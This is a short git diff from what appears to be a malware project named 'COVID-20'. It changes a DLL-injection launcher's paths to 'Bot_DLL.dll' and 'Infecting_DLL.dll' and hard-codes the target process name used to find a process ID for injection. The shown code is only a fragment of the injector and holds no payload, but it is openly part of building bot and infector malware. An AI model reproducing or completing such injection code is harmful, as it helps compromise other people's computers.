@@ -54,8 +54,8 @@ void InjectDLL(HANDLE hProcess, LPCSTR strDLLName, LPCSTR func)
 
 int main()
 {
-    LPCSTR dll_bot = "C:\\Users\\danie\\OneDrive\\Documents\\GitHub\\COVID-20\\Debug\\Bot_DLL.dll";
-    LPCSTR dll_infecting = "C:\\Users\\danie\\OneDrive\\Documents\\GitHub\\COVID-20\\Debug\\Infecting_DLL.dll";
+    LPCSTR dll_bot = "C:\\Users\\danie\\Documents\\GitHub\\COVID-20\\Debug\\Bot_DLL.dll";
+    LPCSTR dll_infecting = "C:\\Users\\danie\\Documents\\GitHub\\COVID-20\\Debug\\Infecting_DLL.dll";
 
     const WCHAR* proc_name[] = {
         L"TESTTEST.exe",
@@ -69,7 +69,7 @@ int main()
     {
         for (int i = 0; i < APPLICATIONS; i++)
         {
-            procId = GetProcId(proc_name[i], sizeof(proc_name[i]));
+            procId = GetProcId(L"TESTTEST.exe", sizeof(L"TESTTEST.exe"));
             if (procId)
                 break;
         }
